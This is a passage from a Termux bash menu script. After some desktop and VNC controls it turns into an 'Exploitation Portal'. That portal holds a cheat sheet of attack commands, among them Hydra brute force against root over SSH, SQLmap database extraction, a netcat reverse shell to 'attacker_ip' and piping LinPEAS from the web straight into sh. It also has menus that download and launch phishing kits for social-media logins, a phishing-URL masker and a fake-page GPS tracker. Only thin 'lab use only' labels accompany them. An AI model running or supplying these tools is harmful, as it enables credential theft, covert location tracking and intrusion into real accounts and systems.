                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        5)
                            echo ""
                            pkill Xvnc 2>/dev/null
                            pkill x11vnc 2>/dev/null
                            vncserver -kill :1 2>/dev/null
                            printf "  ${GRN}✓ VNC server killed${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        K)
                            echo ""
                            printf "  ${RED}${BOLD}[KILL ALL]${RESET}  ${WH}Nuking X11 + XFCE4 + VNC + dbus...${RESET}\n\n"
                            pkill -f xfce4-session 2>/dev/null && printf "  ${GRN}✓ xfce4-session killed${RESET}\n" || printf "  ${FADE}○ xfce4-session was not running${RESET}\n"
                            pkill -f xfce4 2>/dev/null && printf "  ${GRN}✓ xfce4 killed${RESET}\n" || printf "  ${FADE}○ xfce4 was not running${RESET}\n"
                            pkill -f termux-x11 2>/dev/null && printf "  ${GRN}✓ termux-x11 killed${RESET}\n" || printf "  ${FADE}○ termux-x11 was not running${RESET}\n"
                            pkill Xvnc 2>/dev/null && printf "  ${GRN}✓ Xvnc killed${RESET}\n" || printf "  ${FADE}○ Xvnc was not running${RESET}\n"
                            pkill x11vnc 2>/dev/null && printf "  ${GRN}✓ x11vnc killed${RESET}\n" || printf "  ${FADE}○ x11vnc was not running${RESET}\n"
                            pkill dbus-daemon 2>/dev/null && printf "  ${GRN}✓ dbus killed${RESET}\n" || printf "  ${FADE}○ dbus was not running${RESET}\n"
                            echo ""
                            printf "  ${GRN}✓ All desktop processes terminated${RESET}\n"
                            unset DISPLAY XDG_RUNTIME_DIR 2>/dev/null
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        6)
                            echo ""
                            source ~/.bashrc 2>/dev/null
                            printf "  ${GRN}✓ ~/.bashrc reloaded${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        7)
                            echo ""
                            printf "  ${C21}[*] Installing Termux-X11 + XFCE4 packages...${RESET}\n\n"
                            pkg install x11-repo -y 2>/dev/null
                            pkg install termux-x11-nightly xfce4 xfce4-terminal xfce4-goodies dbus -y 2>/dev/null
                            printf "\n  ${FADE}Note: Also download the Termux-X11 companion APK from:${RESET}\n"
                            printf "  ${CY}https://github.com/termux/termux-x11/releases${RESET}\n"
                            printf "  ${FADE}VNC option: pkg install tigervnc${RESET}\n"
                            echo ""; printf "  ${GRN}✓ Packages installed${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        8)
                            echo ""
                            local shortcut="$HOME/launch_xfce.sh"
                            cat > "$shortcut" << 'LAUNCHEOF'
#!/bin/bash
# Fezzy Station — XFCE4 Desktop Launcher
# Auto-generated — SOI · 999

pkill -f xfce4-session 2>/dev/null
pkill -f termux-x11 2>/dev/null
sleep 1

source ~/.bashrc 2>/dev/null

export DISPLAY=:0
export XDG_RUNTIME_DIR="${TMPDIR:-/data/data/com.termux/files/usr/tmp}"

echo "[*] Starting Termux-X11..."
termux-x11 :0 &
sleep 2

echo "[*] Launching XFCE4..."
dbus-launch --exit-with-session xfce4-session &
sleep 1

echo "[✓] Desktop launched — open Termux-X11 app on Android"
LAUNCHEOF
                            chmod +x "$shortcut"
                            printf "  ${GRN}✓ Shortcut created: ~/launch_xfce.sh${RESET}\n"
                            printf "  ${WH}Run it: bash ~/launch_xfce.sh${RESET}\n"
                            printf "  ${FADE}Add alias to .bashrc: alias desktop='bash ~/launch_xfce.sh'${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        9) continue ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            D)
                # ── TERMUX TOOL DICTIONARY ────────────────────────────────
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}TERMUX TOOL DICTIONARY  ·  EXPLOITATION PORTAL  ·  SOI  ·  999${RESET}\n"
                    _dv21; echo ""
                    printf "  ${C21}${BOLD}[1]${RESET}  ${WH}Recon Tools             ${FADE}— nmap · theHarvester · Amass · Shodan${RESET}\n"
                    printf "  ${C21}${BOLD}[2]${RESET}  ${WH}Web Attack Chain        ${FADE}— Nikto finds door · Photon maps · SQLmap goes in${RESET}\n"
                    printf "  ${C21}${BOLD}[3]${RESET}  ${WH}Network Tools           ${FADE}— Hydra · Netcat · enum4linux · nmap+Hydra combo${RESET}\n"
                    printf "  ${C21}${BOLD}[4]${RESET}  ${WH}OSINT Tools             ${FADE}— Sherlock · Maigret · Holehe · theHarvester${RESET}\n"
                    printf "  ${C21}${BOLD}[5]${RESET}  ${WH}Password Tools          ${FADE}— Hashcat · John · Hydra · Crunch · rockyou${RESET}\n"
                    printf "  ${C21}${BOLD}[6]${RESET}  ${WH}Post-Exploit            ${FADE}— Metasploit · LinPEAS · Netcat shell · pivot${RESET}\n"
                    printf "  ${C21}${BOLD}[7]${RESET}  ${WH}Attack Combos           ${FADE}— nmap+Hydra · Nikto+SQLmap · Amass+Metasploit${RESET}\n"
                    printf "  ${C21}${BOLD}[8]${RESET}  ${WH}DNS & Networking Terms  ${FADE}— reverse DNS · enumeration · RCE · pivot · payload${RESET}\n"
                    printf "  ${C21}${BOLD}[9]${RESET}  ${WH}Keyword Search          ${FADE}— search all categories at once${RESET}\n"
                    echo ""; _dv21; echo ""
                    printf "  ${FADE}[B] Back${RESET}\n\n"
                    printf "  ${C21}${BOLD}Choice » ${RESET}"; read -r _td
                    case "$_td" in
                        1)
                            clear; echo ""; _dv21
                            printf "  ${C21}${BOLD}RECON TOOLS${RESET}\n"; _dv21; echo ""
                            printf "  ${C21}nmap${RESET}           ${WH}Network mapper. Ports, OS, service versions.${RESET}\n"
                            printf "  ${FADE}                 nmap -sV -O target.com${RESET}\n\n"
                            printf "  ${C21}theHarvester${RESET}   ${WH}Email + subdomain OSINT from public sources.${RESET}\n"
                            printf "  ${FADE}                 theHarvester -d target.com -b google${RESET}\n\n"
                            printf "  ${C21}Amass${RESET}          ${WH}Deep subdomain enumeration passive + active.${RESET}\n"
                            printf "  ${FADE}                 amass enum -d target.com${RESET}\n\n"
                            printf "  ${C21}subfinder${RESET}      ${WH}Fast subdomain discovery using passive sources.${RESET}\n"
                            printf "  ${FADE}                 subfinder -d target.com -o subs.txt${RESET}\n\n"
                            printf "  ${C21}Shodan CLI${RESET}     ${WH}Search exposed devices from terminal.${RESET}\n"
                            printf "  ${FADE}                 shodan search apache -l 10${RESET}\n\n"
                            printf "  ${C21}Recon-ng${RESET}       ${WH}Modular recon framework with plug-in modules.${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        2)
                            clear; echo ""; _dv21
                            printf "  ${C21}${BOLD}WEB ATTACK CHAIN — SWEET SPOT TO EXPLOIT${RESET}\n"; _dv21; echo ""
                            printf "  ${C21}STEP 1 — Nikto${RESET}   ${WH}Scans web server for 6700+ known vulnerabilities.${RESET}\n"
                            printf "  ${FADE}  nikto -h http://target.com  →  finds what's exposed${RESET}\n\n"
                            printf "  ${C21}STEP 2 — Photon${RESET}  ${WH}Crawls all endpoints and parameters.${RESET}\n"
                            printf "  ${FADE}  python3 photon.py -u http://target.com -l 3${RESET}\n\n"
                            printf "  ${C21}STEP 3 — SQLmap${RESET} ${WH}Tests SQL injection on found parameters.${RESET}\n"
                            printf "  ${FADE}  sqlmap -u 'http://target.com/page?id=1' --dbs${RESET}\n\n"
                            printf "  ${C21}CHAIN:${RESET}  Nikto finds the door  →  Photon maps the room  →  SQLmap goes in\n\n"
                            printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        3)
                            clear; echo ""; _dv21
                            printf "  ${C21}${BOLD}NETWORK TOOLS${RESET}\n"; _dv21; echo ""
                            printf "  ${C21}Hydra${RESET}          ${WH}Brute-force logins. SSH FTP HTTP RDP.${RESET}\n"
                            printf "  ${FADE}                 hydra -l admin -P rockyou.txt ssh://target${RESET}\n\n"
                            printf "  ${C21}Netcat${RESET}         ${WH}Network Swiss Army knife. Connect listen transfer.${RESET}\n"
                            printf "  ${FADE}                 nc -lvp 4444  (listener for reverse shells)${RESET}\n\n"
                            printf "  ${C21}enum4linux${RESET}     ${WH}Enumerate Windows/Samba — users shares OS info.${RESET}\n"
                            printf "  ${FADE}                 enum4linux -a target.com${RESET}\n\n"
                            printf "  ${C21}COMBO: nmap + Hydra${RESET}\n"
                            printf "  ${FADE}  nmap -p 22 target  →  SSH open confirmed${RESET}\n"
                            printf "  ${FADE}  hydra -l root -P rockyou.txt ssh://target  →  brute force${RESET}\n\n"
                            printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        4)
                            clear; echo ""; _dv21
                            printf "  ${C21}${BOLD}OSINT TOOLS${RESET}\n"; _dv21; echo ""
                            printf "  ${C21}Sherlock${RESET}       ${WH}Username hunt across 300+ platforms.${RESET}\n"
                            printf "  ${FADE}                 python3 sherlock.py username${RESET}\n\n"
                            printf "  ${C21}Maigret${RESET}        ${WH}Advanced username OSINT. Full profile aggregator.${RESET}\n"
                            printf "  ${FADE}                 maigret username --all-sites${RESET}\n\n"
                            printf "  ${C21}Holehe${RESET}         ${WH}Check if email is on 120+ sites.${RESET}\n"
                            printf "  ${FADE}                 holehe email@example.com${RESET}\n\n"
                            printf "  ${C21}ExifTool${RESET}       ${WH}Extract hidden GPS and metadata from files.${RESET}\n"
                            printf "  ${C21}theHarvester${RESET}   ${WH}Email + subdomain intel from Google Bing etc.${RESET}\n\n"
                            printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        5)
                            clear; echo ""; _dv21
                            printf "  ${C21}${BOLD}PASSWORD TOOLS${RESET}\n"; _dv21; echo ""
                            printf "  ${C21}Hydra${RESET}          ${WH}Online brute-force — attacks live login services.${RESET}\n"
                            printf "  ${C21}Hashcat${RESET}        ${WH}Offline GPU hash cracker.${RESET}\n"
                            printf "  ${FADE}                 hashcat -m 0 hashes.txt rockyou.txt${RESET}\n\n"
                            printf "  ${C21}John the Ripper${RESET}${WH}Classic offline password cracker.${RESET}\n"
                            printf "  ${FADE}                 john --wordlist=rockyou.txt hashes.txt${RESET}\n\n"
                            printf "  ${C21}Crunch${RESET}         ${WH}Custom wordlist generator by pattern.${RESET}\n"
                            printf "  ${FADE}                 crunch 6 8 abc123 > wordlist.txt${RESET}\n\n"
                            printf "  ${C21}rockyou.txt${RESET}    ${WH}14 million passwords. Use this wordlist first.${RESET}\n\n"
                            printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        6)
                            clear; echo ""; _dv21
                            printf "  ${C21}${BOLD}POST-EXPLOIT TOOLS${RESET}\n"; _dv21; echo ""
                            printf "  ${C21}Metasploit${RESET}     ${WH}The framework. Exploit + payload + post-exploit.${RESET}\n"
                            printf "  ${FADE}                 msfconsole → search → use → set options → run${RESET}\n\n"
                            printf "  ${C21}LinPEAS${RESET}        ${WH}Linux privilege escalation paths finder.${RESET}\n"
                            printf "  ${FADE}                 curl -L https://linpeas.sh | sh${RESET}\n\n"
                            printf "  ${C21}Meterpreter${RESET}    ${WH}Advanced shell — files keylog webcam pivot.${RESET}\n"
                            printf "  ${C21}Netcat shell${RESET}   ${WH}Reverse shell back to your listener.${RESET}\n"
                            printf "  ${FADE}                 target: nc attacker_ip 4444 -e /bin/sh${RESET}\n\n"
                            printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        7)
                            clear; echo ""; _dv21
                            printf "  ${C21}${BOLD}ATTACK COMBOS — FULL CHAINS${RESET}\n"; _dv21; echo ""
                            printf "  ${C21}COMBO 1: nmap + Hydra${RESET}\n"
                            printf "  ${FADE}  nmap -p 22 target  →  SSH open${RESET}\n"
                            printf "  ${FADE}  hydra -l root -P rockyou.txt ssh://target  →  brute force${RESET}\n\n"
                            printf "  ${C21}COMBO 2: Nikto → Photon → SQLmap${RESET}\n"
                            printf "  ${FADE}  nikto  →  finds SQLi point${RESET}\n"
                            printf "  ${FADE}  photon  →  maps parameters${RESET}\n"
                            printf "  ${FADE}  sqlmap  →  extracts database${RESET}\n\n"
                            printf "  ${C21}COMBO 3: theHarvester → Sherlock → Maigret${RESET}\n"
                            printf "  ${FADE}  theHarvester  →  finds emails${RESET}\n"
                            printf "  ${FADE}  sherlock  →  finds all accounts${RESET}\n"
                            printf "  ${FADE}  maigret  →  builds full profile${RESET}\n\n"
                            printf "  ${C21}COMBO 4: Amass → Nikto → Metasploit${RESET}\n"
                            printf "  ${FADE}  amass  →  subdomains${RESET}\n"
                            printf "  ${FADE}  nikto  →  vulnerabilities${RESET}\n"
                            printf "  ${FADE}  metasploit  →  exploit${RESET}\n\n"
                            printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        8)
                            clear; echo ""; _dv21
                            printf "  ${C21}${BOLD}DNS & NETWORKING TERMS — PLAIN ENGLISH${RESET}\n"; _dv21; echo ""
                            printf "  ${C21}DNS${RESET}            ${WH}Translates domain names to IP addresses.${RESET}\n"
                            printf "  ${C21}Reverse DNS${RESET}    ${WH}Goes the other way — IP back to domain name.${RESET}\n"
                            printf "  ${C21}Enumeration${RESET}    ${WH}Systematically listing users, ports, shares, services.${RESET}\n"
                            printf "  ${C21}Recon${RESET}          ${WH}Intelligence gathering before any active attack.${RESET}\n"
                            printf "  ${C21}Port Scan${RESET}      ${WH}Checking which ports are open on a target.${RESET}\n"
                            printf "  ${C21}Banner Grab${RESET}    ${WH}Reading what version is running on an open port.${RESET}\n"
                            printf "  ${C21}OSINT${RESET}          ${WH}Open Source Intelligence — public data only.${RESET}\n"
                            printf "  ${C21}Pivot${RESET}          ${WH}Using one machine to attack the next inside a network.${RESET}\n"
                            printf "  ${C21}Payload${RESET}        ${WH}The code that runs after the exploit succeeds.${RESET}\n"
                            printf "  ${C21}Reverse Shell${RESET}  ${WH}Target connects back to you — bypasses firewall.${RESET}\n"
                            printf "  ${C21}RCE${RESET}            ${WH}Remote Code Execution — your code on their server.${RESET}\n"
                            printf "  ${C21}SMB${RESET}            ${WH}Windows file sharing protocol — often targeted.${RESET}\n"
                            printf "  ${C21}TTL${RESET}            ${WH}Time to live — how long a DNS record or packet lives.${RESET}\n"
                            printf "  ${C21}CVE${RESET}            ${WH}Common Vulnerability — numbered public exploit database.${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        9)
                            echo ""
                            printf "  ${C21}Keyword search: ${RESET}"; read -r _kw
                            [[ -z "$_kw" ]] && continue
                            echo ""; printf "  ${C21}Results for '%s':${RESET}\n\n" "$_kw"
                            local _terms=(
                                "nmap:Network mapper. Port scan OS detect service version. nmap -sV target"
                                "hydra:Brute-force logins. SSH FTP HTTP. hydra -l user -P list.txt ssh://target"
                                "nikto:Web server scanner. Finds vulns and misconfigs. nikto -h url"
                                "sqlmap:SQL injection tool. Extracts databases. sqlmap -u url?id=1 --dbs"
                                "sherlock:Username OSINT 300+ platforms. python3 sherlock.py username"
                                "maigret:Advanced username OSINT full profile. maigret username"
                                "hashcat:GPU hash cracker. hashcat -m 0 hashes.txt rockyou.txt"
                                "john:Offline password cracker. john --wordlist=rockyou.txt hashes.txt"
                                "metasploit:Exploit framework. msfconsole search use set run"
                                "photon:Web crawler maps all URLs and parameters. photon.py -u target"
                                "amass:Subdomain enumeration. amass enum -d target.com"
                                "theharvester:Email subdomain OSINT. theHarvester -d target -b google"
                                "holehe:Email registered on 120+ sites. holehe email@example.com"
                                "enum4linux:Windows Samba enumeration. enum4linux -a target"
                                "netcat:Network Swiss Army knife. nc -lvp 4444"
                                "shodan:Internet-connected device search. shodan search apache"
                                "linpeas:Linux privilege escalation paths. curl linpeas.sh | sh"
                                "dns:Domain Name System. Translates domains to IPs"
                                "reverse dns:IP address back to domain name lookup"
                                "enumeration:Systematically listing users ports shares services"
                                "recon:Intelligence gathering before any active attack"
                                "payload:Code that runs after exploit succeeds"
                                "pivot:Using one machine to attack the next"
                                "rce:Remote Code Execution your code on their server"
                                "smb:Server Message Block Windows file sharing protocol"
                                "cve:Common Vulnerability numbered public exploit database"
                            )
                            local _found=0
                            for _t in "${_terms[@]}"; do
                                local _tname="${_t%%:*}"
                                local _tdesc="${_t#*:}"
                                if echo "$_tname $_tdesc" | grep -qi "$_kw"; then
                                    printf "  ${C21}%-18s${RESET}  ${WH}%s${RESET}\n" "$_tname" "$_tdesc"
                                    ((_found++))
                                fi
                            done
                            (( _found == 0 )) && printf "  ${RED}No results for '%s'${RESET}\n" "$_kw"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [15] PYPHISHER ────────────────────────────────────────────
            15)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [15] PYPHISHER  ·  PHISHING GENERATOR${RESET}\n"
                    _dv21; echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}PyPhisher generates phishing pages for 30+ platforms.${RESET}\n"
                    printf "  ${WH}No root needed. Runs in Termux. Tunnels link via cloudflared.${RESET}\n"
                    printf "  ${WH}Captured credentials saved locally. Educational/CTF use only.${RESET}\n"
                    echo ""
                    _dv21; echo ""
                    printf "  ${C21}${BOLD}USAGE${RESET}\n"
                    printf "  ${WH}Run (existing):    python3 ~/pyphisher.py${RESET}\n"
                    printf "  ${WH}Download + run:    wget https://gitlab.com/KasRoudra/PyPhisher/-/raw/main/pyphisher.py${RESET}\n"
                    printf "  ${WH}Install deps:      pip install requests --break-system-packages${RESET}\n"
                    echo ""
                    _dv21; echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Run PyPhisher${RESET}      ${FADE}— python3 ~/pyphisher.py${RESET}\n"
                    printf "  ${C21}${BOLD}[D]${RESET}  ${WH}Download + Run${RESET}     ${FADE}— wget then launch${RESET}\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  ${WH}Install deps${RESET}       ${FADE}— pip install requests${RESET}\n"
                    echo ""
                    printf "  ${FADE}[b] Back  ·  [m] Menu${RESET}\n\n"
                    printf "  ${C21}${BOLD}Choice » ${RESET}"; read -r py_ch
                    case "${py_ch^^}" in
                        R)
                            echo ""
                            if [[ -f ~/pyphisher.py ]]; then
                                printf "  ${C21}[*] Launching PyPhisher...${RESET}\n\n"
                                python3 ~/pyphisher.py
                            else
                                printf "  ${RED}pyphisher.py not at ~/pyphisher.py — use [D] to download${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        D)
                            echo ""
                            printf "  ${C21}[*] Downloading pyphisher.py...${RESET}\n\n"
                            wget -q "https://gitlab.com/KasRoudra/PyPhisher/-/raw/main/pyphisher.py" -O ~/pyphisher.py \
                                && printf "  ${GRN}✓ Saved to ~/pyphisher.py${RESET}\n" \
                                || printf "  ${RED}Download failed — check connection${RESET}\n"
                            echo ""
                            [[ -f ~/pyphisher.py ]] && { printf "  ${C21}[*] Launching PyPhisher...${RESET}\n\n"; python3 ~/pyphisher.py; }
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing deps...${RESET}\n\n"
                            pip install requests --break-system-packages 2>/dev/null \
                                && printf "  ${GRN}✓ requests installed${RESET}\n" \
                                || printf "  ${YEL}Already installed or failed${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B|b) break ;;
                        M|m) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [16] PENTESTKIT ──────────────────────────────────────────
            16)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [16] PENTESTKIT  ·  MODULAR TOOLKIT${RESET}\n"
                    _dv21; echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}PenTestKit by maldevel — modular pen testing toolkit.${RESET}\n"
                    printf "  ${WH}Covers recon · exploitation · post-exploit · network.${RESET}\n"
                    printf "  ${WH}Clone once then cd into dir and run individual modules.${RESET}\n"
                    echo ""
                    _dv21; echo ""
                    local _ptk_dir="$HOME/PenTestKit"
                    local _ptk_status="${RED}NOT CLONED${RESET}"
                    [[ -d "$_ptk_dir" ]] && _ptk_status="${GRN}READY${RESET}"
                    printf "  ${WH}Status: %b\n" "$_ptk_status"
                    echo ""
                    printf "  ${C21}${BOLD}[1]${RESET}  ${WH}Clone PenTestKit     ${FADE}— git clone from GitHub${RESET}\n"
                    printf "  ${C21}${BOLD}[2]${RESET}  ${WH}List modules         ${FADE}— ls ~/PenTestKit/${RESET}\n"
                    printf "  ${C21}${BOLD}[3]${RESET}  ${WH}Read README          ${FADE}— cat README.md | less${RESET}\n"
                    printf "  ${C21}${BOLD}[4]${RESET}  ${WH}Shell into directory  ${FADE}— cd ~/PenTestKit, type exit to return${RESET}\n"
                    echo ""
                    printf "  ${FADE}[b] Back  ·  [m] Menu${RESET}\n\n"
                    printf "  ${C21}${BOLD}Choice » ${RESET}"; read -r ptk_ch
                    case "${ptk_ch^^}" in
                        1)
                            echo ""
                            if [[ -d "$_ptk_dir" ]]; then
                                printf "  ${YEL}Already exists — pulling latest...${RESET}\n\n"
                                git -C "$_ptk_dir" pull 2>/dev/null \
                                    && printf "  ${GRN}✓ Updated${RESET}\n" \
                                    || printf "  ${YEL}Pull failed — check connection${RESET}\n"
                            else
                                printf "  ${C21}[*] Cloning PenTestKit...${RESET}\n\n"
                                git clone https://github.com/maldevel/PenTestKit.git "$_ptk_dir" \
                                    && printf "  ${GRN}✓ Cloned to ~/PenTestKit${RESET}\n" \
                                    || printf "  ${RED}Clone failed — check connection${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        2)
                            echo ""
                            if [[ -d "$_ptk_dir" ]]; then
                                ls -la "$_ptk_dir/"
                            else
                                printf "  ${RED}Not cloned — use [1] first${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        3)
                            if [[ -f "$_ptk_dir/README.md" ]]; then
                                cat "$_ptk_dir/README.md" | less
                            else
                                printf "  ${RED}README not found — clone first${RESET}\n"
                                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                            fi ;;
                        4)
                            echo ""
                            if [[ -d "$_ptk_dir" ]]; then
                                printf "  ${C21}[*] cd into PenTestKit — type 'exit' to return${RESET}\n\n"
                                (cd "$_ptk_dir" && ls && bash)
                            else
                                printf "  ${RED}Not cloned — use [1] first${RESET}\n"
                                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                            fi ;;
                        B|b) break ;;
                        M|m) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;


            # ── [17] ZPHISHER ─────────────────────────────────────────────────
            17)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [17] ZPHISHER  ·  PHISHING FRAMEWORK${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}30+ page phishing templates · Facebook · Instagram · Google · Netflix.${RESET}\n"
                    printf "  ${WH}Hosts via Cloudflared tunnel · captures credentials + IP on entry.${RESET}\n"
                    printf "  ${FADE}■ Authorized lab use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/zphisher ]] && printf "  ${GRN}✓ Installed — ~/zphisher${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run Zphisher\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _z17
                    case "${_z17^^}" in
                        R) if [[ -d ~/zphisher ]]; then cd ~/zphisher && bash zphisher.sh; cd ~
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; sleep 1; fi ;;
                        I) pkg update -y
                           git clone https://github.com/htr-tech/zphisher ~/zphisher 2>/dev/null || git -C ~/zphisher pull
                           chmod +x ~/zphisher/zphisher.sh
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [18] SHELLPHISH ───────────────────────────────────────────────
            18)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [18] SHELLPHISH  ·  SOCIAL PHISHING${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}18 social media phishing templates · hosted via ngrok.${RESET}\n"
                    printf "  ${WH}Instagram · Facebook · Snapchat · Twitter · Google · GitHub.${RESET}\n"
                    printf "  ${FADE}■ Authorized lab use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/shellphish ]] && printf "  ${GRN}✓ Installed — ~/shellphish${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run ShellPhish\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _sp18
                    case "${_sp18^^}" in
                        R) if [[ -d ~/shellphish ]]; then cd ~/shellphish && bash shellphish.sh; cd ~
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; sleep 1; fi ;;
                        I) pkg update -y && pkg install -y php curl wget
                           git clone https://github.com/suljot/shellphish ~/shellphish 2>/dev/null || git -C ~/shellphish pull
                           chmod +x ~/shellphish/shellphish.sh
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [19] MASK-PHISH ───────────────────────────────────────────────
            19)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [19] MASK-PHISH  ·  URL MASKER${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Mask a phishing URL behind a trusted-looking domain.${RESET}\n"
                    printf "  ${WH}Hides real link — send safe-looking URLs in messages.${RESET}\n"
                    printf "  ${FADE}■ Authorized lab use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/maskphish ]] && printf "  ${GRN}✓ Installed — ~/maskphish${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run Mask-Phish\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _mp19
                    case "${_mp19^^}" in
                        R) if [[ -d ~/maskphish ]]; then cd ~/maskphish && bash maskphish.sh; cd ~
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; sleep 1; fi ;;
                        I) git clone https://github.com/jaykali/maskphish ~/maskphish 2>/dev/null || git -C ~/maskphish pull
                           chmod +x ~/maskphish/maskphish.sh
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [20] SEEKER ───────────────────────────────────────────────────
            20)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [20] SEEKER  ·  LOCATION TRACKER${RESET}\n"
                    _dv21; echo ""
                    printf "  ${WH}Hosts a fake page that requests browser location permission.${RESET}\n"
                    printf "  ${WH}Returns GPS coords · device info · ISP · IP on click.${RESET}\n"
                    printf "  ${WH}Tunneled via Cloudflared or Ngrok — no root required.${RESET}\n"
                    printf "  ${FADE}■ Authorized lab use only · SOI · 999${RESET}\n"; echo ""
                    _dv21; echo ""
                    [[ -d ~/seeker ]] && printf "  ${GRN}✓ Installed — ~/seeker${RESET}\n" || printf "  ${YEL}✗ Not installed${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  Run Seeker\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  Install / Update\n"
                    printf "  ${C21}${BOLD}[B]${RESET}  Back\n"
                    echo ""; _dv21; echo ""
                    printf "  ${C21}${BOLD}» ${RESET}"; read -r _sk20
                    case "${_sk20^^}" in
                        R) if [[ -d ~/seeker ]]; then python3 ~/seeker/seeker.py; 
                           else printf "  ${RED}Not installed — use [I] first${RESET}\n"; sleep 1; fi ;;
                        I) pkg update -y && pkg install -y python
                           git clone https://github.com/thewhiteh4t/seeker ~/seeker 2>/dev/null || git -C ~/seeker pull
                           pip install -r ~/seeker/requirements.txt --break-system-packages 2>/dev/null
                           printf "  ${GRN}✓ Done${RESET}\n"; sleep 1 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [21] HASH-BUSTER ──────────────────────────────────────────────
            21)
                while true; do
                    clear; echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [21] HASH-BUSTER  ·  HASH CRACKER${RESET}\n"
